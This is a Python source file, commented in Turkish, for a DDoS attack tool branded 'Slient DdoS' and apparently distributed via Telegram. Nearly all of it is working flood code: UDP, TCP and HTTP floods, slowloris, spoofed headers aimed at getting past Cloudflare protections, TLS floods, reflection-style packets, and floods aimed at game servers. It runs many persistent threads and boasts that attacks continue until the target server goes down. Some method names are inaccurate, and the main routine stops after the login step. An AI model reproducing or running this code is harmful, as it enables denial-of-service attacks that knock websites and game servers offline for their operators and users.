#!/usr/bin/python3
import os, time, sys, hashlib, socket, threading, platform, random, struct, json, base64, ssl
import urllib.request, urllib.parse, http.client, subprocess, getpass
from concurrent.futures import ThreadPoolExecutor

# ========== GİRİŞ SİSTEMİ ==========
KULLANICI_ADI = "Zeldy"
SIFRE = " "

def login():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(gradient_text(pad + "╔═════════════════════════════════════╗"))
    print(gradient_text(pad + "║      Slient DdoS Login              ║"))
    print(gradient_text(pad + "║   For the password: t.me/Zeldy_here ║"))
    print(gradient_text(pad + "╚═════════════════════════════════════╝"))
    
    username = input("Username:  ")
    password = getpass.getpass("password: ")
    
    if username != KULLANICI_ADI or password != SIFRE:
        print("\nHatalı kullanıcı adı veya şifre!")
        time.sleep(2)
        return False
    
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mSlient \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Zeldy ! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Zeldy \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v4.0')
    time.sleep(1)
    return True

# ========== GEREKLİ KÜTÜPHANELER ==========
try:
    import cloudscraper
    import requests
    import socks
    import dns.resolver
    from colorama import Fore, init, Style
    init()
except ImportError:
    os.system("pip install cloudscraper requests PySocks dnspython colorama")
    import cloudscraper
    import requests
    import socks
    import dns.resolver
    from colorama import Fore, init, Style
    init()
    

# ========== PROXY YÖNETİCİ ==========
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.load_proxies()
        self.test_proxies()
    
    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        self.proxies.append(line)
        
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt"
        ]
        for src in sources:
            try:
                r = requests.get(src, timeout=3)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if ':' in line and len(line.split(':')) == 2:
                            if line not in self.proxies:
                                self.proxies.append(line)
            except:
                pass
        
        if not self.proxies:
            for _ in range(500):
                self.proxies.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}:{random.randint(1000,65535)}")
        

    
    def test_proxies(self):
        def test_single(proxy):
            try:
                ip, port = proxy.split(':')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((ip, int(port)))
                s.close()
                return proxy
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=100) as ex:
            futures = [ex.submit(test_single, p) for p in self.proxies[:800]]
            for f in futures:
                result = f.result()
                if result:
                    self.working.append(result)
        
        if not self.working and self.proxies:
            for p in self.proxies[:300]:
                try:
                    ip, port = p.split(':')
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((ip, int(port)))
                    s.close()
                    self.working.append(p)
                except:
                    pass
        
    
    def get_proxy(self):
        with self.lock:
            if self.working:
                proxy = self.working[self.current_index % len(self.working)]
                self.current_index += 1
                return proxy
            return None

# ========== GRADIENT TEXT ==========
line_palette = [
    27, 33, 39, 45, 51, 50, 49,
    50, 51, 45, 39, 33, 27
]

def gradient_text(text):
    result = ""
    for i, char in enumerate(text):
        color = line_palette[i % len(line_palette)]
        result += f"\033[38;5;{color}m{char}"
    return result + "\033[0m"

print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mZxC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to ZxC C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zxcr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v4.0')

pad = " " * 4
small_pad = " " * 7

ascii_art = [
"         ╔═╗ ╦   ╦ ╔═╗ ╔╗╔ ╔╦╗",
"         ╚═╗ ║   ║ ║╣  ║║║  ║ ",
"         ╚═╝ ╚═╝ ╩ ╚═╝ ╝╚╝  ╩ "
]

def show_logo_and_boxes():
    for line in ascii_art:
        print(gradient_text(pad + line))
    print(gradient_text(pad + "╔════════════════════════════════════╗"))
    print(gradient_text(pad + "║        DdoS Attack Tool            ║"))
    print(gradient_text(pad + "║      Telegram: @SlientBotnet       ║"))
    print(gradient_text(pad + "╚════════════════════════════════════╝"))
    print(gradient_text(small_pad + "╔══════════════════════════════╗"))
    print(gradient_text(small_pad + "║    write 'help' for usage    ║"))
    print(gradient_text(small_pad + "╚══════════════════════════════╝"))

# ========== HIZ KONTROL ==========
class SpeedControl:
    def __init__(self, hiz=50):
        self.hiz = max(1, min(1000000, hiz))
        self.thread_carpani = self.hiz / 5
        self.packet_carpani = self.hiz / 2
        self.delay_carpani = max(0.000001, 0.01 / self.hiz)
        self.cpu_limit = 85
        self.ram_limit = 90
        
    def get_thread(self, base=500):
        return min(1024, int(base * self.thread_carpani) + 50)
    
    def get_packet(self, base=500):
        return min(10000, int(base * self.packet_carpani) + 50)
    
    def get_delay(self):
        return self.delay_carpani
    
    def check_system(self):
        try:
            cpu = psutil.cpu_percent(interval=0.1)
            ram = psutil.virtual_memory().percent
            if cpu > self.cpu_limit or ram > self.ram_limit:
                time.sleep(0.5)
                return False
            return True
        except:
            return True

# ========== SALDIRI MOTORU (KALICI) ==========
class AttackEngine:
    def __init__(self, target, port, method, hiz=50):
        self.target = target
        self.port = port
        self.method = method
        self.hiz = hiz
        self.ip = socket.gethostbyname(target)
        self.running = True
        self.packet_count = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.speed = SpeedControl(hiz)
        self.proxy_manager = ProxyManager()
        
        # 5000+ fake IP
        self.fake = []
        for _ in range(5000):
            self.fake.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        
        self.ua = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0)',
            'Mozilla/5.0 (Android 14; Mobile) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) Chrome/119.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/119.0.0.0'
        ]
        self.packet_pool = [random._urandom(65500) for _ in range(50)]
        self.small_pool = [random._urandom(1490) for _ in range(50)]

    # ===== LAYER 4 - UDP/TCP =====
    def run_udp(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**27)
        adet = self.speed.get_packet(500)
        for _ in range(adet):
            s.sendto(random.choice(self.packet_pool), (self.ip, self.port))
        s.close()
        with self.lock:
            self.packet_count += adet

    def run_udp_multi(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**27)
        for p in range(self.port-50, self.port+51):
            if 1 < p < 65535:
                s.sendto(random.choice(self.small_pool), (self.ip, p))
        s.close()
        with self.lock:
            self.packet_count += 100

    def run_udp_frag(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(200):
            s.sendto(random._urandom(1400), (self.ip, self.port))
            s.sendto(random._urandom(1400), (self.ip, self.port+1))
        s.close()
        with self.lock:
            self.packet_count += 400

    def run_tcp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.001)
            s.setblocking(False)
            for _ in range(5):
                s.connect_ex((self.ip, self.port))
                s.send(random._urandom(1024))
            s.close()
            with self.lock:
                self.packet_count += 5
        except:
            pass

    def run_tcp_syn(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.001)
            s.connect_ex((self.ip, self.port))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_tcp_ack(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.001)
            s.connect_ex((self.ip, self.port))
            s.send(b'ACK' + random._urandom(100))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_tcp_rst(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.001)
            s.connect_ex((self.ip, self.port))
            s.send(b'RST' + random._urandom(50))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== LAYER 7 - HTTP =====
    def run_http(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            for _ in range(30):
                req = f"GET /{random.randint(1,999999)}?{random._urandom(50).hex()} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(self.ua)}\r\n\r\n"
                s.send(req.encode())
            s.close()
            with self.lock:
                self.packet_count += 30
        except:
            pass

    def run_http_post(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            data = random._urandom(500000)
            req = f"POST /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\nContent-Length: {len(data)}\r\n\r\n".encode()
            s.send(req + data)
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_http_head(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            for _ in range(20):
                req = f"HEAD /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                s.send(req.encode())
            s.close()
            with self.lock:
                self.packet_count += 20
        except:
            pass

    def run_http_options(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            for _ in range(20):
                req = f"OPTIONS / HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                s.send(req.encode())
            s.close()
            with self.lock:
                self.packet_count += 20
        except:
            pass

    def run_http_put(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            data = random._urandom(300000)
            req = f"PUT /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\nContent-Length: {len(data)}\r\n\r\n".encode()
            s.send(req + data)
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_http_delete(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            req = f"DELETE /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
            s.send(req.encode())
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_http_trace(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            req = f"TRACE / HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
            s.send(req.encode())
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_slowloris(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.ip, self.port))
            s.send(f"GET /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\n".encode())
            for _ in range(20):
                s.send(f"X-Header: {random._urandom(100).hex()}\r\n".encode())
                time.sleep(0.1)
            s.close()
            with self.lock:
                self.packet_count += 20
        except:
            pass

    def run_http_overflow(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((self.ip, self.port))
            req = f"GET /{'A'*1000000} HTTP/1.1\r\nHost: {self.target}\r\n\r\n".encode()
            s.send(req)
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== BYPASS =====
    def run_bypass(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((self.ip, self.port))
            fake = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers = [
                f"GET /{random.randint(1,999)}?{random._urandom(50).hex()} HTTP/1.1",
                f"Host: {self.target}",
                f"User-Agent: {random.choice(self.ua)}",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language: tr-TR,tr;q=0.9,en;q=0.8",
                "Accept-Encoding: gzip, deflate, br",
                "Cache-Control: no-cache", "Pragma: no-cache",
                "Sec-Ch-Ua: \"Chromium\";v=\"120\", \"Not_A Brand\";v=\"8\"",
                "Sec-Ch-Ua-Mobile: ?0", "Sec-Ch-Ua-Platform: \"Windows\"",
                "Sec-Fetch-Dest: document", "Sec-Fetch-Mode: navigate",
                "Sec-Fetch-Site: none", "Sec-Fetch-User: ?1",
                "Upgrade-Insecure-Requests: 1",
                f"X-Forwarded-For: {fake}", f"X-Real-IP: {fake}",
                "Connection: keep-alive", "\r\n"
            ]
            s.send(("\r\n".join(headers)).encode() * 3)
            s.close()
            with self.lock:
                self.packet_count += 3
        except:
            pass

    def run_cfbypass(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((self.ip, self.port))
            fake = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            payload = f"GET /{random.randint(1,999)}?{random._urandom(100).hex()} HTTP/1.1\r\n"
            payload += f"Host: {self.target}\r\n"
            payload += f"User-Agent: {random.choice(self.ua)}\r\n"
            payload += f"X-Forwarded-For: {fake}\r\n"
            payload += f"X-Real-IP: {fake}\r\n"
            payload += f"CF-Connecting-IP: {fake}\r\n"
            payload += "Accept-Encoding: identity\r\n"
            payload += "Connection: keep-alive\r\n\r\n"
            s.send(payload.encode() * 3)
            s.close()
            with self.lock:
                self.packet_count += 3
        except:
            pass

    # ===== TLS/SSL =====
    def run_tls(self):
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            ssl_sock = context.wrap_socket(s, server_hostname=self.target)
            ssl_sock.connect((self.ip, self.port))
            payload = f"GET /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(self.ua)}\r\n\r\n".encode() * 10
            ssl_sock.send(payload)
            ssl_sock.close()
            with self.lock:
                self.packet_count += 10
        except:
            pass

    def run_tls_post(self):
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            ssl_sock = context.wrap_socket(s, server_hostname=self.target)
            ssl_sock.connect((self.ip, self.port))
            data = random._urandom(300000)
            req = f"POST /{random.randint(1,999)} HTTP/1.1\r\nHost: {self.target}\r\nContent-Length: {len(data)}\r\n\r\n".encode()
            ssl_sock.send(req + data)
            ssl_sock.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_tls_reneg(self):
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            ssl_sock = context.wrap_socket(s, server_hostname=self.target)
            ssl_sock.connect((self.ip, self.port))
            for _ in range(30):
                ssl_sock.send(b"GET / HTTP/1.1\r\n\r\n")
                ssl_sock.do_handshake()
            ssl_sock.close()
            with self.lock:
                self.packet_count += 30
        except:
            pass

    def run_tls_heartbleed(self):
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            ssl_sock = context.wrap_socket(s, server_hostname=self.target)
            ssl_sock.connect((self.ip, self.port))
            ssl_sock.send(b'\x18\x03\x02\x00\x03\x01\x40\x00' + random._urandom(65535))
            ssl_sock.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== AMPLIFICATION =====
    def run_dns_amp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
            s.sendto(query, (self.ip, 53))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_ntp_amp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ntp = b'\x17\x00\x03\x2a' + b'\x00' * 8
            s.sendto(ntp, (self.ip, 123))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_ssdp_amp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ssdp = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
            s.sendto(ssdp, (self.ip, 1900))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_memcached_amp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            memcached = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
            s.sendto(memcached, (self.ip, 11211))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_chargen_amp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'\x00'*10, (self.ip, 19))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== GAME SERVERS =====
    def run_minecraft(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'\x02\x00\x00\x00\x00\x00\x00\x00\x00', (self.ip, self.port if self.port else 25565))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_minecraft_query(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'\xFE\xFD\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            s.sendto(packet, (self.ip, self.port if self.port else 25565))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_samp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b'SAMP' + random._urandom(500), (self.ip, self.port if self.port else 7777))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_samp_rcon(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'SAMP' + b'\x00\x00\x00\x00' + b'rcon' + random._urandom(100)
            s.sendto(packet, (self.ip, self.port if self.port else 7777))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_csgo(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'\xFF\xFF\xFF\xFFTSource Engine Query\x00'
            s.sendto(packet, (self.ip, self.port if self.port else 27015))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_csgo_amp(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'\xFF\xFF\xFF\xFF\x54\x00\x00\x00\x00' + random._urandom(1000)
            s.sendto(packet, (self.ip, self.port if self.port else 27015))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_rust(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'\xFF\xFF\xFF\xFF\x54' + random._urandom(500)
            s.sendto(packet, (self.ip, self.port if self.port else 28015))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_gta5(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1000)
            s.sendto(packet, (self.ip, self.port if self.port else 6672))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    def run_fivem(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(500)
            s.sendto(packet, (self.ip, self.port if self.port else 30120))
            s.close()
            with self.lock:
                self.packet_count += 1
        except:
            pass

    # ===== KALICI SALDIRI (SUNUCU KAPANANA KADAR) =====
    def attack_loop(self):
        delay = self.speed.get_delay()
        while self.running:
            if not self.speed.check_system():
                time.sleep(0.1)
                continue
            try:
                if self.method == '!udp':
                    self.run_udp()
                elif self.method == '!udpmulti':
                    self.run_udp_multi()
                elif self.method == '!udpfrag':
                    self.run_udp_frag()
                elif self.method == '!tcp':
                    self.run_tcp()
                elif self.method == '!syn':
                    self.run_tcp_syn()
                elif self.method == '!ack':
                    self.run_tcp_ack()
                elif self.method == '!rst':
                    self.run_tcp_rst()
                elif self.method == '!http':
                    self.run_http()
                elif self.method == '!httppost':
                    self.run_http_post()
                elif self.method == '!head':
                    self.run_http_head()
                elif self.method == '!options':
                    self.run_http_options()
                elif self.method == '!put':
                    self.run_http_put()
                elif self.method == '!delete':
                    self.run_http_delete()
                elif self.method == '!trace':
                    self.run_http_trace()
                elif self.method == '!slowloris':
                    self.run_slowloris()
                elif self.method == '!overflow':
                    self.run_http_overflow()
                elif self.method == '!bypass':
                    self.run_bypass()
                elif self.method == '!cfbypass':
                    self.run_cfbypass()
                elif self.method == '!tls':
                    self.run_tls()
                elif self.method == '!tlspost':
                    self.run_tls_post()
                elif self.method == '!tlsreneg':
                    self.run_tls_reneg()
                elif self.method == '!heartbleed':
                    self.run_tls_heartbleed()
                elif self.method == '!dns':
                    self.run_dns_amp()
                elif self.method == '!ntp':
                    self.run_ntp_amp()
                elif self.method == '!ssdp':
                    self.run_ssdp_amp()
                elif self.method == '!memcached':
                    self.run_memcached_amp()
                elif self.method == '!chargen':
                    self.run_chargen_amp()
                elif self.method == '!mc':
                    self.run_minecraft()
                elif self.method == '!mcquery':
                    self.run_minecraft_query()
                elif self.method == '!samp':
                    self.run_samp()
                elif self.method == '!samprcon':
                    self.run_samp_rcon()
                elif self.method == '!csgo':
                    self.run_csgo()
                elif self.method == '!csgoamp':
                    self.run_csgo_amp()
                elif self.method == '!rust':
                    self.run_rust()
                elif self.method == '!gta5':
                    self.run_gta5()
                elif self.method == '!fivem':
                    self.run_fivem()
                elif self.method == '!all':
                    self.run_udp()
                    self.run_tcp()
                    self.run_http()
                    self.run_bypass()
                    self.run_tls()
                    self.run_minecraft()
                    self.run_dns_amp()
                elif self.method == '!max':
                    for _ in range(3):
                        self.run_udp()
                        self.run_udp_multi()
                        self.run_tcp()
                        self.run_http()
                        self.run_bypass()
                        self.run_cfbypass()
                        self.run_tls()
                        self.run_tls_post()
                        self.run_minecraft()
                        self.run_samp()
                        self.run_csgo()
                        self.run_dns_amp()
                        self.run_ntp_amp()
                elif self.method == '!bypassall':
                    self.run_bypass()
                    self.run_cfbypass()
                    self.run_tls()
                    self.run_tls_post()
                    self.run_tls_reneg()
                    self.run_tls_heartbleed()
                elif self.method == '!game':
                    self.run_minecraft()
                    self.run_minecraft_query()
                    self.run_samp()
                    self.run_samp_rcon()
                    self.run_csgo()
                    self.run_csgo_amp()
                    self.run_rust()
                    self.run_gta5()
                    self.run_fivem()
                elif self.method == '!amp':
                    self.run_dns_amp()
                    self.run_ntp_amp()
                    self.run_ssdp_amp()
                    self.run_memcached_amp()
                    self.run_chargen_amp()
                elif self.method == '!tlsall':
                    self.run_tls()
                    self.run_tls_post()
                    self.run_tls_reneg()
                    self.run_tls_heartbleed()
                elif self.method == '!httpall':
                    self.run_http()
                    self.run_http_post()
                    self.run_http_head()
                    self.run_http_options()
                    self.run_http_put()
                    self.run_http_delete()
                    self.run_http_trace()
                    self.run_slowloris()
                    self.run_http_overflow()
                else:
                    self.run_udp()
                time.sleep(delay)
            except:
                continue

    def start_attack(self):
        print(Fore.GREEN + f"\n[✓] Hedef: {self.target} ({self.ip}:{self.port})")
        print(Fore.GREEN + f"[✓] Yöntem: {self.method.upper()}")
        print(Fore.GREEN + f"[✓] Hız: {self.hiz}")
        print(Fore.GREEN + f"[✓] Proxy: {len(self.proxy_manager.working)} çalışan")
        
        thrs = self.speed.get_thread(500)
        print(Fore.YELLOW + f"[*] {thrs} thread başlatılıyor (KALICI SALDIRI)...")
        
        for _ in range(thrs):
            t = threading.Thread(target=self.attack_loop, daemon=True)
            t.start()
        
        print(Fore.RED + "[*] SUNUCU KAPANANA KADAR SALDIRI DEVAM EDECEK!" + Fore.RESET)
        print(Fore.YELLOW + "[*] Çıkmak için CTRL+C\n")
        
        try:
            while self.running:
                time.sleep(5)
                elapsed = time.time() - self.start_time
                pps = self.packet_count / elapsed if elapsed > 0 else 0
                print(Fore.CYAN + f"[+] {self.packet_count:,} paket | PPS: {pps:,.0f} | {elapsed:.0f}s" + Fore.RESET)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Durduruldu." + Fore.RESET)
            self.running = False

# ========== YARDIM ==========
def show_help():
    print(Fore.LIGHTCYAN_EX + "\n" + "="*60)
    print(Fore.LIGHTCYAN_EX + " SLİENT DDoS v4.0 - KALICI SALDIRI")
    print(Fore.LIGHTCYAN_EX + "="*60)
    print(Fore.LIGHTGREEN_EX + "   <Hedef> <Port> <!Yöntem> <Hız(1-999)>")
    print(Fore.WHITE + "\n🔥 LAYER 4 (UDP/TCP):")
    print(Fore.LIGHTYELLOW_EX + "  !udp, !udpmulti, !udpfrag, !tcp, !syn, !ack, !rst")
    print(Fore.WHITE + "\n🌐 LAYER 7 (HTTP):")
    print(Fore.LIGHTYELLOW_EX + "  !http, !httppost, !head, !options, !put, !delete, !trace")
    print(Fore.LIGHTYELLOW_EX + "  !slowloris, !overflow, !httpall")
    print(Fore.WHITE + "\n🛡️ BYPASS & TLS:")
    print(Fore.LIGHTYELLOW_EX + "  !bypass, !cfbypass, !tls, !tlspost, !tlsreneg, !heartbleed")
    print(Fore.LIGHTYELLOW_EX + "  !bypassall, !tlsall")
    print(Fore.WHITE + "\n📡 AMPLIFICATION:")
    print(Fore.LIGHTYELLOW_EX + "  !dns, !ntp, !ssdp, !memcached, !chargen, !amp")
    print(Fore.WHITE + "\n🎮 GAME SERVERS:")
    print(Fore.LIGHTYELLOW_EX + "  !mc, !mcquery (Minecraft)")
    print(Fore.LIGHTYELLOW_EX + "  !samp, !samprcon (SA-MP)")
    print(Fore.LIGHTYELLOW_EX + "  !csgo, !csgoamp (CS:GO)")
    print(Fore.LIGHTYELLOW_EX + "  !rust, !gta5, !fivem")
    print(Fore.LIGHTYELLOW_EX + "  !game (Tüm oyunlar)")
    print(Fore.WHITE + "\n⚡ KOMBİNE:")
    print(Fore.LIGHTYELLOW_EX + "  !all, !max")
    print(Fore.WHITE + "\n📌 ÖRNEKLER:")
    print(Fore.LIGHTGREEN_EX + "   example.com 443 !tls 200")
    print(Fore.LIGHTGREEN_EX + "   example.com 25565 !mc 999")
    print(Fore.LIGHTGREEN_EX + "   example.com 80 !httpall 150")
    print(Fore.LIGHTGREEN_EX + "   example.com 27015 !csgo 300")
    print(Fore.LIGHTGREEN_EX + "   example.com 443 !bypassall 500")
    print(Fore.LIGHTGREEN_EX + "   example.com 7777 !game 400")
    print(Fore.LIGHTGREEN_EX + "   example.com 53 !dns 100")
    print(Fore.RED + "\n⚠️  SALDIRI KALICIDIR - SUNUCU KAPANANA KADAR DEVAM EDER!" + Fore.RESET)
    sys.exit()

# ========== PROMPT ==========
def prompt():
    print(Fore.WHITE + "┌──[SlientC2] - [SlientC2/root]")
    print(Fore.WHITE + "└─➤  ", end="")
    sys.stdout.write("\033[0m")
    sys.stdout.flush() 
    return input()

# ========== ANA ==========
if __name__ == "__main__":
    if not login():
        sys.exit(1)
    
    if os.name == "posix": os.system('clear')
